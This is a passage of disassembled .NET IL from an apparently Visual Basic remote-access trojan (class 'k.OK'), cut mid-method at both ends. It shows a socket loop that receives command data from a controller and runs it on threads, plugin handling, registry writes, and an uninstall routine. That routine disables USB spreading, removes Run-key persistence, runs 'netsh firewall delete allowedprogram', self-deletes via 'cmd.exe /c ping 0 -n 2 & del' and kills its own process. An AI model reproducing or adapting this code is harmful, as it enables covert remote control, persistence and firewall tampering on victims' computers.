      IL_00a6:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_00ab:  stloc.0
      IL_00ac:  ldstr      ""
      IL_00b1:  stloc.s    V_4
      IL_00b3:  ldloc.0
      IL_00b4:  ldc.i4.0
      IL_00b5:  conv.i8
      IL_00b6:  bne.un.s   IL_00c7

      IL_00b8:  ldarg.0
      IL_00b9:  ldstr      ""
      IL_00be:  callvirt   instance bool k.OK::Send(string)
      IL_00c3:  pop
      IL_00c4:  ldc.i4.m1
      IL_00c5:  conv.i8
      IL_00c6:  stloc.0
      IL_00c7:  ldarg.0
      IL_00c8:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
      IL_00cd:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00d2:  ldc.i4.0
      IL_00d3:  bgt.s      IL_005a

      IL_00d5:  br         IL_001b

      IL_00da:  ldloc.s    V_4
      IL_00dc:  ldloc.s    V_5
      IL_00de:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_00e3:  stloc.s    V_8
      IL_00e5:  ldloca.s   V_8
      IL_00e7:  call       instance string [mscorlib]System.Char::ToString()
      IL_00ec:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00f1:  stloc.s    V_4
      IL_00f3:  br.s       IL_007a

      IL_00f5:  ldarg.0
      IL_00f6:  ldarg.0
      IL_00f7:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
      IL_00fc:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0101:  ldc.i4.1
      IL_0102:  add.ovf
      IL_0103:  ldc.i4.1
      IL_0104:  sub.ovf
      IL_0105:  ldc.i4.1
      IL_0106:  add.ovf
      IL_0107:  newarr     [mscorlib]System.Byte
      IL_010c:  stfld      uint8[] k.OK::b
      IL_0111:  ldloc.0
      IL_0112:  ldarg.0
      IL_0113:  ldfld      class [mscorlib]System.IO.MemoryStream k.OK::MeM
      IL_0118:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_011d:  sub.ovf
      IL_011e:  stloc.3
      IL_011f:  ldarg.0
      IL_0120:  ldfld      uint8[] k.OK::b
      IL_0125:  ldlen
      IL_0126:  conv.ovf.i4
      IL_0127:  conv.i8
      IL_0128:  ldloc.3
      IL_0129:  ble.s      IL_0141

      IL_012b:  ldarg.0
      IL_012c:  ldloc.3
      IL_012d:  ldc.i4.1
      IL_012e:  conv.i8
      IL_012f:  sub.ovf
      IL_0130:  conv.ovf.i4
      IL_0131:  ldc.i4.1
      IL_0132:  add.ovf
      IL_0133:  ldc.i4.1
      IL_0134:  sub.ovf
      IL_0135:  ldc.i4.1
      IL_0136:  add.ovf
      IL_0137:  newarr     [mscorlib]System.Byte
      IL_013c:  stfld      uint8[] k.OK::b
      IL_0141:  ldarg.0
      IL_0142:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
      IL_0147:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_014c:  ldarg.0
      IL_014d:  ldfld      uint8[] k.OK::b
      IL_0152:  ldc.i4.0
      IL_0153:  ldarg.0
      IL_0154:  ldfld      uint8[] k.OK::b
      IL_0159:  ldlen
      IL_015a:  conv.ovf.i4
      IL_015b:  ldc.i4.0
      IL_015c:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_0161:  stloc.2
      IL_0162:  ldarg.0
      IL_0163:  ldfld      class [mscorlib]System.IO.MemoryStream k.OK::MeM
      IL_0168:  ldarg.0
      IL_0169:  ldfld      uint8[] k.OK::b
      IL_016e:  ldc.i4.0
      IL_016f:  ldloc.2
      IL_0170:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0175:  ldarg.0
      IL_0176:  ldfld      class [mscorlib]System.IO.MemoryStream k.OK::MeM
      IL_017b:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0180:  ldloc.0
      IL_0181:  bne.un     IL_001b

      IL_0186:  ldc.i4.m1
      IL_0187:  conv.i8
      IL_0188:  stloc.0
      IL_0189:  ldarg.0
      IL_018a:  dup
      IL_018b:  ldvirtftn  instance void k.OK::_Lambda$__2(object)
      IL_0191:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_0196:  ldc.i4.1
      IL_0197:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_019c:  stloc.s    V_6
      IL_019e:  ldloc.s    V_6
      IL_01a0:  ldarg.0
      IL_01a1:  ldfld      class [mscorlib]System.IO.MemoryStream k.OK::MeM
      IL_01a6:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_01ab:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_01b0:  ldloc.s    V_6
      IL_01b2:  ldc.i4.s   100
      IL_01b4:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_01b9:  pop
      IL_01ba:  ldarg.0
      IL_01bb:  ldfld      class [mscorlib]System.IO.MemoryStream k.OK::MeM
      IL_01c0:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_01c5:  ldarg.0
      IL_01c6:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_01cb:  stfld      class [mscorlib]System.IO.MemoryStream k.OK::MeM
      IL_01d0:  br         IL_001b

      IL_01d5:  leave.s    IL_01e3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01d7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01dc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01e1:  leave.s    IL_01e3

    }  // end handler
    IL_01e3:  nop
    .try
    {
      IL_01e4:  ldarg.0
      IL_01e5:  ldfld      object k.OK::PLG
      IL_01ea:  brfalse.s  IL_020f

      IL_01ec:  ldarg.0
      IL_01ed:  ldfld      object k.OK::PLG
      IL_01f2:  ldnull
      IL_01f3:  ldstr      "clear"
      IL_01f8:  ldc.i4.0
      IL_01f9:  newarr     [mscorlib]System.Object
      IL_01fe:  ldnull
      IL_01ff:  ldnull
      IL_0200:  ldnull
      IL_0201:  ldc.i4.1
      IL_0202:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0207:  pop
      IL_0208:  ldarg.0
      IL_0209:  ldnull
      IL_020a:  stfld      object k.OK::PLG
      IL_020f:  leave.s    IL_021d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0211:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0216:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_021b:  leave.s    IL_021d

    }  // end handler
    IL_021d:  ldarg.0
    IL_021e:  ldc.i4.0
    IL_021f:  stfld      bool k.OK::Cn
    IL_0224:  ldarg.0
    IL_0225:  callvirt   instance bool k.OK::connect()
    IL_022a:  brtrue.s   IL_022e

    IL_022c:  br.s       IL_01e3

    IL_022e:  ldarg.0
    IL_022f:  ldc.i4.1
    IL_0230:  stfld      bool k.OK::Cn
    IL_0235:  br         IL_0000
  } // end of method OK::RC

  .method public instance bool  Send(string s) cil managed
  {
    // Code size       15 (0xf)
    .maxstack  3
    .locals init (bool V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldarg.0
    IL_0002:  ldarga.s   s
    IL_0004:  callvirt   instance uint8[] k.OK::SB(string&)
    IL_0009:  callvirt   instance bool k.OK::Sendb(uint8[])
    IL_000e:  ret
  } // end of method OK::Send

  .method public instance bool  Sendb(uint8[] b) cil managed
  {
    // Code size       211 (0xd3)
    .maxstack  5
    .locals init (bool V_0,
             class [mscorlib]System.IO.FileInfo V_1,
             uint8[] V_2,
             class [mscorlib]System.IO.MemoryStream V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.IO.FileInfo V_6,
             string V_7)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool k.OK::Cn
    IL_0006:  brtrue.s   IL_000a

    IL_0008:  ldc.i4.0
    IL_0009:  ret

    .try
    {
      IL_000a:  ldarg.0
      IL_000b:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_0010:  stloc.1
      IL_0011:  ldloc.1
      IL_0012:  stloc.s    V_6
      IL_0014:  ldloc.s    V_6
      IL_0016:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_001b:  ldarg.0
        IL_001c:  ldfld      bool k.OK::Cn
        IL_0021:  brtrue.s   IL_002a

        IL_0023:  ldc.i4.0
        IL_0024:  stloc.0
        IL_0025:  leave      IL_00d1

        IL_002a:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_002f:  stloc.3
        IL_0030:  ldarg.1
        IL_0031:  ldlen
        IL_0032:  conv.ovf.i4
        IL_0033:  stloc.s    V_4
        IL_0035:  ldarg.0
        IL_0036:  ldloc.s    V_4
        IL_0038:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_003d:  ldstr      bytearray (00 00 ) 
        IL_0042:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0047:  stloc.s    V_7
        IL_0049:  ldloca.s   V_7
        IL_004b:  callvirt   instance uint8[] k.OK::SB(string&)
        IL_0050:  stloc.2
        IL_0051:  ldloc.3
        IL_0052:  ldloc.2
        IL_0053:  ldc.i4.0
        IL_0054:  ldloc.2
        IL_0055:  ldlen
        IL_0056:  conv.ovf.i4
        IL_0057:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_005c:  ldloc.3
        IL_005d:  ldarg.1
        IL_005e:  ldc.i4.0
        IL_005f:  ldarg.1
        IL_0060:  ldlen
        IL_0061:  conv.ovf.i4
        IL_0062:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0067:  ldarg.0
        IL_0068:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
        IL_006d:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0072:  ldloc.3
        IL_0073:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0078:  ldc.i4.0
        IL_0079:  ldloc.3
        IL_007a:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_007f:  conv.ovf.i4
        IL_0080:  ldc.i4.0
        IL_0081:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_0086:  pop
        IL_0087:  leave.s    IL_00ca

      }  // end .try
      finally
      {
        IL_0089:  ldloc.s    V_6
        IL_008b:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_0090:  endfinally
      }  // end handler
      IL_0091:  leave.s    IL_00ca

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0093:  dup
      IL_0094:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0099:  stloc.s    V_5
      .try
      {
        IL_009b:  ldarg.0
        IL_009c:  ldfld      bool k.OK::Cn
        IL_00a1:  brfalse.s  IL_00b5

        IL_00a3:  ldarg.0
        IL_00a4:  ldc.i4.0
        IL_00a5:  stfld      bool k.OK::Cn
        IL_00aa:  ldarg.0
        IL_00ab:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
        IL_00b0:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00b5:  leave.s    IL_00c3

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00c1:  leave.s    IL_00c3

      }  // end handler
      IL_00c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c8:  leave.s    IL_00ca

    }  // end handler
    IL_00ca:  ldarg.0
    IL_00cb:  ldfld      bool k.OK::Cn
    IL_00d0:  ret

    IL_00d1:  ldloc.0
    IL_00d2:  ret
  } // end of method OK::Sendb

  .method public instance bool  STV(string n,
                                    object t,
                                    valuetype [mscorlib]Microsoft.Win32.RegistryValueKind typ) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  4
    .locals init (bool V_0)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
      IL_0006:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0010:  ldstr      "software\\"
      IL_0015:  ldarg.0
      IL_0016:  ldfld      string k.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0025:  ldarg.1
      IL_0026:  ldarg.2
      IL_0027:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002c:  ldarg.3
      IL_002d:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0032:  ldc.i4.1
      IL_0033:  stloc.0
      IL_0034:  leave.s    IL_0044

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0036:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003b:  ldc.i4.0
      IL_003c:  stloc.0
      IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0042:  leave.s    IL_0044

    }  // end handler
    IL_0044:  ldloc.0
    IL_0045:  ret
  } // end of method OK::STV

  .method public instance void  UNS() cil managed noinlining nooptimization
  {
    // Code size       497 (0x1f1)
    .maxstack  4
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.0
    IL_0002:  callvirt   instance void k.OK::pr(int32)
    IL_0007:  ldarg.0
    IL_0008:  ldc.i4.0
    IL_0009:  stfld      bool k.OK::Isu
    IL_000e:  ldarg.0
    IL_000f:  ldfld      bool k.OK::Spr
    IL_0014:  brfalse.s  IL_001d

    IL_0016:  ldarg.0
    IL_0017:  ldc.i4.0
    IL_0018:  callvirt   instance void k.OK::USBspr(bool)
    .try
    {
      IL_001d:  ldarg.0
      IL_001e:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_0023:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0028:  ldc.i4.0
      IL_0029:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::SetAttr(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
      IL_002e:  leave.s    IL_003c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003a:  leave.s    IL_003c

    }  // end handler
    .try
    {
      IL_003c:  ldc.i4.7
      IL_003d:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0042:  ldstr      "\\"
      IL_0047:  ldarg.0
      IL_0048:  ldfld      string k.OK::RG
      IL_004d:  ldstr      ".exe"
      IL_0052:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0057:  ldc.i4     0x80
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::SetAttr(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
      IL_0061:  leave.s    IL_006f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0063:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006d:  leave.s    IL_006f

    }  // end handler
    .try
    {
      IL_006f:  ldarg.0
      IL_0070:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
      IL_0075:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_007a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_007f:  ldarg.0
      IL_0080:  ldfld      string k.OK::sf
      IL_0085:  ldc.i4.1
      IL_0086:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_008b:  ldarg.0
      IL_008c:  ldfld      string k.OK::RG
      IL_0091:  ldc.i4.0
      IL_0092:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0097:  leave.s    IL_00a5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0099:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_009e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00a3:  leave.s    IL_00a5

    }  // end handler
    .try
    {
      IL_00a5:  ldarg.0
      IL_00a6:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
      IL_00ab:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00b0:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_00b5:  ldarg.0
      IL_00b6:  ldfld      string k.OK::sf
      IL_00bb:  ldc.i4.1
      IL_00bc:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_00c1:  ldarg.0
      IL_00c2:  ldfld      string k.OK::RG
      IL_00c7:  ldc.i4.0
      IL_00c8:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_00cd:  leave.s    IL_00db

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d9:  leave.s    IL_00db

    }  // end handler
    .try
    {
      IL_00db:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_00e0:  ldstr      "Software\\"
      IL_00e5:  ldc.i4.1
      IL_00e6:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_00eb:  ldarg.0
      IL_00ec:  ldfld      string k.OK::RG
      IL_00f1:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKeyTree(string)
      IL_00f6:  leave.s    IL_0104

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0102:  leave.s    IL_0104

    }  // end handler
    .try
    {
      IL_0104:  ldstr      "netsh firewall delete allowedprogram \""
      IL_0109:  ldarg.0
      IL_010a:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_010f:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0114:  ldstr      "\""
      IL_0119:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_011e:  ldc.i4.0
      IL_011f:  ldc.i4.0
      IL_0120:  ldc.i4.m1
      IL_0121:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0126:  pop
      IL_0127:  leave.s    IL_0135

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0129:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0133:  leave.s    IL_0135

    }  // end handler
    .try
    {
      IL_0135:  ldarg.0
      IL_0136:  ldfld      class [mscorlib]System.IO.FileStream k.OK::FS
      IL_013b:  brfalse.s  IL_0168

      IL_013d:  ldarg.0
      IL_013e:  ldfld      class [mscorlib]System.IO.FileStream k.OK::FS
      IL_0143:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0148:  ldc.i4.7
      IL_0149:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_014e:  ldstr      "\\"
      IL_0153:  ldarg.0
      IL_0154:  ldfld      string k.OK::RG
      IL_0159:  ldstr      ".exe"
      IL_015e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0163:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0168:  leave.s    IL_0176

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_016a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_016f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0174:  leave.s    IL_0176

    }  // end handler
    .try
    {
      IL_0176:  ldarg.0
      IL_0177:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
      IL_017c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0181:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0186:  ldstr      "software"
      IL_018b:  ldc.i4.1
      IL_018c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0191:  ldarg.0
      IL_0192:  ldfld      string k.OK::RG
      IL_0197:  ldc.i4.0
      IL_0198:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_019d:  leave.s    IL_01ab

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_019f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01a9:  leave.s    IL_01ab

    }  // end handler
    .try
    {
      IL_01ab:  ldstr      "cmd.exe /c ping 0 -n 2 & del \""
      IL_01b0:  ldarg.0
      IL_01b1:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_01b6:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01bb:  ldstr      "\""
      IL_01c0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01c5:  ldc.i4.0
      IL_01c6:  ldc.i4.0
      IL_01c7:  ldc.i4.m1
      IL_01c8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01cd:  pop
      IL_01ce:  leave.s    IL_01dc

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01d0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01da:  leave.s    IL_01dc

    }  // end handler
    IL_01dc:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
    IL_01e1:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
    IL_01e6:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
    IL_01eb:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_01f0:  ret
  } // end of method OK::UNS

  .method public instance uint8[]  ZIP(uint8[] B) cil managed
  {
    // Code size       105 (0x69)
    .maxstack  4
    .locals init (uint8[] V_0,
             uint8[] V_1,
             int32 V_2,
             class [mscorlib]System.IO.MemoryStream V_3,
             class [System]System.IO.Compression.GZipStream V_4,
             uint8[] V_5)
    IL_0000:  ldarg.1
    IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0006:  stloc.3
    IL_0007:  ldloc.3
    IL_0008:  ldc.i4.0
    IL_0009:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_000e:  stloc.s    V_4
    IL_0010:  ldc.i4.4
    IL_0011:  newarr     [mscorlib]System.Byte
    IL_0016:  stloc.1
    IL_0017:  ldloc.3
    IL_0018:  ldloc.3
    IL_0019:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_001e:  ldc.i4.5
    IL_001f:  conv.i8
    IL_0020:  sub.ovf
    IL_0021:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0026:  ldloc.3
    IL_0027:  ldloc.1
    IL_0028:  ldc.i4.0
    IL_0029:  ldc.i4.4
    IL_002a:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_002f:  pop
    IL_0030:  ldloc.1
    IL_0031:  ldc.i4.0
    IL_0032:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_0037:  stloc.2
    IL_0038:  ldloc.3
    IL_0039:  ldc.i4.0
    IL_003a:  conv.i8
    IL_003b:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0040:  ldloc.2
    IL_0041:  ldc.i4.1
    IL_0042:  sub.ovf
    IL_0043:  ldc.i4.1
    IL_0044:  add.ovf
    IL_0045:  ldc.i4.1
    IL_0046:  sub.ovf
    IL_0047:  ldc.i4.1
    IL_0048:  add.ovf
    IL_0049:  newarr     [mscorlib]System.Byte
    IL_004e:  stloc.0
    IL_004f:  ldloc.s    V_4
    IL_0051:  ldloc.0
    IL_0052:  ldc.i4.0
    IL_0053:  ldloc.2
    IL_0054:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_0059:  pop
    IL_005a:  ldloc.s    V_4
    IL_005c:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0061:  ldloc.3
